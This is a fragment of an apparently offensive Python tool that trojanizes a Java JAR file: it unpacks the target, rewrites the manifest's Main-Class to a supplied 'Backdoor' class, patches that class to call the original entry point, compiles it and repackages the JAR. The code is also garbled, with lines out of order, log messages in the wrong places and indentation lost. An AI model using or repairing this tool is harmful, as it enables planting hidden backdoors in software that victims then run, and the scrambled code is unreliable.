def start():...
print('[*] Starting backdoor process')
print('[*] Decompressing target to tmp directory...')
zip.extractall('tmp')
print('[*] Target dumped to tmp directory')
print('[*] Modifying manifest file...')
oldmain = ''
man = open('tmp/META-INF/MANIFEST.MF', 'r').read()
for l in man.split('\n'):
if 'Main-Class' in l:
print('[*] Manifest file modified')
oldmain = l[12:]
f.write('%s\n' % l)
print('[*] Modifying provided backdoor...')
f.write('Main-Class: %s\n' % 'Backdoor')
inmain = False
level = 0
bd = open(backdoor, 'r').read()
for l in bd.split('\n'):
if 'main(' in l:
print('[*] Provided backdoor successfully modified')
inmain = True
if '}' in l and level < 2 and inmain:
print('[*] Compiling modified backdoor...')
f.write(l)
f.write('%s.main(args);}' % oldmain)
if '}' in l and level > 1 and inmain:
if subprocess.call('javac -cp tmp/ tmp/%s' % backdoor, shell=True) != 0:
inmain = False
level -= 1
if '{' in l and inmain:
print('[!] Error compiling %s' % backdoor)
print('[*] Compiled modified backdoor')
f.write(l)
level += 1
f.write(l)
if len(oldmain) < 1:
f.write(l)
print('[!] Main-Class manifest attribute not found')
print('[*] Repackaging target jar file...')
shutil.rmtree('tmp/')
createZip('tmp', outfile)
print('[*] Target jar successfully repackaged')
